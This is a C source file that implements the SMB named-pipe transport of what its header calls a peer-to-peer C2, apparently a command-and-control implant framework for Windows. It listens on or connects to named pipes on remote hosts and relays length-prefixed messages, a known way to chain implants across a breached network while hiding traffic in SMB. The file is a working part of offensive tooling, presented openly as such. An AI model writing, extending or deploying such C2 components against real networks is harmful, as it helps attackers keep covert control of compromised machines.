/**
 * transport_smb.c - SMB named pipe transport for P2P C2
 */
#include <windows.h>
#include <stdio.h>
#include "../../include/transport.h"

#define SMB_PIPE_BUF 65536

BOOL smb_transport_listen(SMB_TRANSPORT *t, const char *pipe_name) {
    if (!t || !pipe_name) return FALSE;
    ZeroMemory(t, sizeof(SMB_TRANSPORT));
    lstrcpynA(t->pipe_name, pipe_name, sizeof(t->pipe_name));
    t->is_server = TRUE;

    t->pipe_handle = CreateNamedPipeA(
        t->pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,
        SMB_PIPE_BUF, SMB_PIPE_BUF,
        0, NULL);

    if (t->pipe_handle == INVALID_HANDLE_VALUE) return FALSE;

    if (!ConnectNamedPipe(t->pipe_handle, NULL) &&
        GetLastError() != ERROR_PIPE_CONNECTED) {
        CloseHandle(t->pipe_handle);
        t->pipe_handle = INVALID_HANDLE_VALUE;
        return FALSE;
    }
    return TRUE;
}

BOOL smb_transport_connect(SMB_TRANSPORT *t, const char *host, const char *pipe_name) {
    if (!t || !host || !pipe_name) return FALSE;
    ZeroMemory(t, sizeof(SMB_TRANSPORT));

    char full_pipe[512];
    if (pipe_name[0] == '\\') {
        lstrcpynA(full_pipe, pipe_name, sizeof(full_pipe));
    } else {
        _snprintf(full_pipe, sizeof(full_pipe), "\\\\%s\\pipe\\%s", host, pipe_name);
    }
    lstrcpynA(t->pipe_name, full_pipe, sizeof(t->pipe_name));
    t->is_server = FALSE;

    t->pipe_handle = CreateFileA(
        full_pipe,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);

    return t->pipe_handle != INVALID_HANDLE_VALUE;
}

BOOL smb_transport_send(SMB_TRANSPORT *t, const BYTE *data, DWORD data_len) {
    if (!t || t->pipe_handle == INVALID_HANDLE_VALUE || !data) return FALSE;

    BYTE hdr[4];
    hdr[0] = (BYTE)((data_len >> 24) & 0xFF);
    hdr[1] = (BYTE)((data_len >> 16) & 0xFF);
    hdr[2] = (BYTE)((data_len >> 8) & 0xFF);
    hdr[3] = (BYTE)(data_len & 0xFF);

    DWORD written = 0;
    if (!WriteFile(t->pipe_handle, hdr, 4, &written, NULL) || written != 4)
        return FALSE;

    DWORD total = 0;
    while (total < data_len) {
        if (!WriteFile(t->pipe_handle, data + total, data_len - total, &written, NULL))
            return FALSE;
        total += written;
    }
    return TRUE;
}

BOOL smb_transport_recv(SMB_TRANSPORT *t, BYTE **out_data, DWORD *out_len) {
    if (!t || t->pipe_handle == INVALID_HANDLE_VALUE || !out_data || !out_len)
        return FALSE;

    BYTE hdr[4];
    DWORD read = 0;
    if (!ReadFile(t->pipe_handle, hdr, 4, &read, NULL) || read != 4)
        return FALSE;

    DWORD data_len = ((DWORD)hdr[0] << 24) | ((DWORD)hdr[1] << 16) |
                     ((DWORD)hdr[2] << 8) | (DWORD)hdr[3];
    if (data_len == 0 || data_len > MAX_OUTPUT_SIZE) return FALSE;

    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, data_len);
    if (!buf) return FALSE;

    DWORD total = 0;
    while (total < data_len) {
        if (!ReadFile(t->pipe_handle, buf + total, data_len - total, &read, NULL)) {
            HeapFree(GetProcessHeap(), 0, buf);
            return FALSE;
        }
        total += read;
    }

    *out_data = buf;
    *out_len = data_len;
    return TRUE;
}

void smb_transport_close(SMB_TRANSPORT *t) {
    if (!t) return;
    if (t->pipe_handle != INVALID_HANDLE_VALUE) {
        if (t->is_server)
            DisconnectNamedPipe(t->pipe_handle);
        CloseHandle(t->pipe_handle);
        t->pipe_handle = INVALID_HANDLE_VALUE;
    }
}
